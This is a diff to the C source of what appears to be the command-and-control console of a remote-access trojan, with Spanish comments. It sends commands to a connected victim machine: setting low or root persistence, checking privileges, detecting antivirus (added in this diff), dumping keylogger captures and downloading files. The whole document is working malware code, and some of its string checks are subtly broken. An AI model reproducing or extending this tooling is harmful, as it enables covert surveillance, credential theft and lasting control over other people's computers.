@@ -1,6 +1,6 @@
 #include <stdio.h>
 #include <stdbool.h>
-#include <string.h> 
+#include <string.h>
 #include <stdlib.h> 
 #include <sys/types.h>   
 #include <signal.h>
@@ -18,8 +18,9 @@
 
 /*
 
-- Arreglar salida en download
-- Upload funciona perfectemente
+  Creado por "an0mal1a"
+
+       https://github.com/an0mal1a
 
 */
 
@@ -58,6 +59,15 @@ void StartSending(SOCKET targetConn, char *instruct);
 void closeConection(SOCKET targetConn, char *command, size_t instructLen, char *clientIP, unsigned short clientPort);
 long get_file_size(char* filename);
 
+// Estructuras de datos
+typedef struct {
+    char sysinfo[2048];
+    char checkAv[2048]; 
+    char persistence[2048];
+    char lowpersistence[2048];
+} Commands;
+Commands CachedCommands;
+
 long get_file_size(char* filename) {
     struct _stat file_status;
     if (_stat(filename, &file_status) < 0) {
@@ -73,17 +83,20 @@ void ctrlCHandler(int sig) {
 }
 
 int getSystemInformation(SOCKET targetConn, char *command){
-    send(targetConn, command, strlen(command), 0);
-    char recvData[SOCKBUFFER];
-    memset(recvData, 0, SOCKBUFFER);
+    if (CachedCommands.sysinfo[0] == '\0'){
+    
+        send(targetConn, command, strlen(command), 0);
+        char recvData[SOCKBUFFER];
+        memset(recvData, 0, SOCKBUFFER);
 
-    while (true){
         recv(targetConn, recvData, SOCKBUFFER, 0);
-        if (strstr(recvData, "end\0") == 0){
-            printf("%s", recvData);
-            break;
-        }
-    }
+        strncpy(CachedCommands.sysinfo, recvData, sizeof(recvData));
+        //CachedCommands.sysinfo = "";
+        printf("%s", recvData);
+
+    } else
+        printf("\n[*] Cached Command:\n%s", CachedCommands.sysinfo);
+
     return 0;
     //return recvData;   
 }
@@ -138,6 +151,8 @@ void helpPannel(){
     printf("\t\t| [!>] persistence           -> Set a high mode of persistence (root)\n");
     printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] check                 -> Check privileges\n");
+    printf("\t\t---------------------------------------------------------\n");
+    printf("\t\t| [!>] checkAv               -> Check for AntiVirus\n");
     printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] dumpkeys              -> Dump key recorded by keylogger\n");
     printf("\t\t---------------------------------------------------------\n");
@@ -310,14 +325,7 @@ int downloadFunc(char *command, SOCKET targetConn, char *ip){
             fwrite(recvData, 1, bytesReadCurrent, fp);
             memset(recvData, 0, SOCKBUFFER);            
             break;
-        }
-
-        /*
-        if (strcmp((char *)recvData, "end\0") == 0){
-                break;
-            }
-        */
-        
+        }       
         fwrite(recvData, 1, bytesReadCurrent, fp);
         bytesRead += bytesReadCurrent;
         printProgressBar(bytesRead, fullBytes);
@@ -328,32 +336,49 @@ int downloadFunc(char *command, SOCKET targetConn, char *ip){
 
 }
 
-int setPersistence(SOCKET targetConn, char *command, char *method){
-    send(targetConn, command, strlen(command), 0);
+int setPersistence(SOCKET targetConn, char *command, char *method) {
     char recvData[SOCKBUFFER];
     memset(recvData, 0, sizeof(recvData));
 
-    recv(targetConn, recvData, SOCKBUFFER, 0);
-
-    if (strcmp(method, "low") == 0){
-        if (strstr("error", recvData) != NULL){
-            printColor("\n\n\t[!>] ", RED); printColor("Error geting low persistence...", YELLOW);
-        }
-        else if (strstr("exito", recvData) != NULL){
-            printColor("\n\t[*>] ", YELLOW); printColor("Low persistence setted succsessfully...\n", BLUE);    
-        }
+    if (strcmp(method, "high") == 0 && CachedCommands.persistence[0] != '\0') {
+        printf("\n\t[*] Cached Command: %s\n", CachedCommands.persistence);
+        return 0;  
     }
 
-    if (strcmp(method, "high") == 0){
-        if (strstr("error", recvData) != NULL){
-            printColor("\n\n\t[!>] ", RED); printColor("Error high persistence...", YELLOW);    
-        
-        } else if (strstr("exito", recvData) != NULL){
-            printColor("\n\t[*>] ", YELLOW); printColor("High persistence setted succsessfully...\n", BLUE);
+    else if (strcmp(method, "low") == 0) { 
+        if (CachedCommands.lowpersistence[0] != '\0') {
+            // El comando lowpersistence ya está en la caché
+            printf("\n\t[*] Cached Command: %s \n", CachedCommands.lowpersistence);
+            return 0; 
+        } else if (CachedCommands.persistence[0] != '\0') {
+            // El comando high ya está en la caché, mostrar el mensaje de caché
+            printf("\n\t[*] Cached Command: %s \n", CachedCommands.persistence);
+            return 0; 
+        } 
+    }
 
-        } else if (strstr("permissonError", recvData) != NULL){
-            printColor("\n\t[!>] ", YELLOW); printColor("Error setting persistence, PermissonError...\n", BLUE);
-        
+    if (strcmp(method, "low") == 0 || strcmp(method, "high") == 0) {
+        send(targetConn, command, strlen(command), 0);
+        recv(targetConn, recvData, SOCKBUFFER, 0);
+
+        if (strcmp(method, "low") == 0) {
+            if (strstr("error", recvData) != NULL) {
+                printColor("\n\n\t[!>] ", RED); printColor("Error getting low persistence...\n\n", YELLOW);
+            } else if (strstr("exito", recvData) != NULL) {
+                strncpy(CachedCommands.lowpersistence, "Low persistence has been added successfully!", sizeof(CachedCommands.lowpersistence));
+                printColor("\n\t[*>] ", YELLOW); printColor("Low persistence set successfully...\n", BLUE);
+            }
+        }
+
+        if (strcmp(method, "high") == 0) {
+            if (strstr("error", recvData) != NULL) {
+                printColor("\n\n\t[!>] ", RED); printColor("Error high persistence...\n\n", YELLOW);
+            } else if (strstr("exito", recvData) != NULL) {
+                strncpy(CachedCommands.persistence, "High persistence has been added successfully!", sizeof(CachedCommands.persistence));
+                printColor("\n\t[*>] ", YELLOW); printColor("High persistence set successfully...\n", BLUE);
+            } else if (strstr("permissonError", recvData) != NULL) {
+                printColor("\n\t[!>] ", YELLOW); printColor("Error setting persistence, Permission Error...\n", BLUE);
+            }
         }
     }
 
@@ -434,6 +459,25 @@ int startRecord(char *command, SOCKET targetConn, char* clientIP) {
     return 0;
 }
 
+int recvAv(SOCKET targetConn, char *command){
+    if (CachedCommands.checkAv[0] == '\0'){
+    
+        char recvData[1024];
+        size_t size = 0;
+
+        memset(recvData, 0, 1024);
+        send(targetConn, command, strlen(command), 0);
+
+        recv(targetConn, recvData, 1024, 0);
+        printf("%s\n", recvData);
+
+        strncpy(CachedCommands.checkAv, recvData, 1024);
+    
+    } else 
+        printf("\n[*] Cached Command: \n%s", CachedCommands.checkAv);
+    return 0;
+}
+
 int mainFunction(int targetConn, char *clientIP, unsigned short clientPort){
     char command[SOCKBUFFER] = "";
     char resp[SOCKBUFFER];
@@ -501,6 +545,9 @@ int mainFunction(int targetConn, char *clientIP, unsigned short clientPort){
 
             }else if (strcmp(command, "dumpkeys") == 0) { 
                 downloadFunc("download keylog", targetConn, clientIP); 
+
+            } else if(strcmp(command, "checkAv") == 0) {
+                recvAv(targetConn, command);
 
             }
             else {
